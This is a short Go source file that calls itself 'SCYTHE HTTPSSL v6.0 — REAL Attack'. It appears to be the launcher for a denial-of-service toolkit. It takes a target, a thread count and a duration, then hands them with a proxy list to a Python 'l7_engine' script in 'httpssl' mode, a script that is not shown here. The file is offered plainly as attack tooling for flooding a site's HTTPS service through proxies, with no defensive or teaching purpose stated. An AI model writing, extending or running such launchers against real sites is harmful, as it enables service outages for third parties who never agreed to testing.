package main
// SCYTHE HTTPSSL v6.0 — REAL Attack (calls Python engine)
import (
    "fmt"
    "os"
    "os/exec"
)

func main() {
    if len(os.Args) < 4 {
        fmt.Println("Usage: go run httpssl.go <target> <threads> <GET> <duration>")
        os.Exit(1)
    }

    target := os.Args[1]
    threads := os.Args[2]
    duration := os.Args[len(os.Args)-1]

    cmd := exec.Command("python3", "methods/l7_engine.py", "httpssl", target, duration, threads, "proxies.txt")
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Run()
}
